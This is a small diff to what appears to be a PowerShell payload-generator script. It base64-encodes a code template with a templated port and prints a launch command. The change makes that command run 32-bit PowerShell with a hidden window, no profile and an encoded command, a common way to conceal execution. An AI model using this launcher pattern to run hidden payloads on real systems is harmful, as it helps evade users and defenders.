@@ -71,4 +71,4 @@ $code = $code -replace "PORT_TOKEN", "$port"
 $codebytes = [System.Text.Encoding]::Unicode.GetBytes($code)
 $base64code = [System.Convert]::ToBase64String($codebytes)
 
-Write-Host "powershell.exe -EncodedCommand $base64code"
+Write-Host "cmd /c c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle hidden -EncodedCommand $base64code"
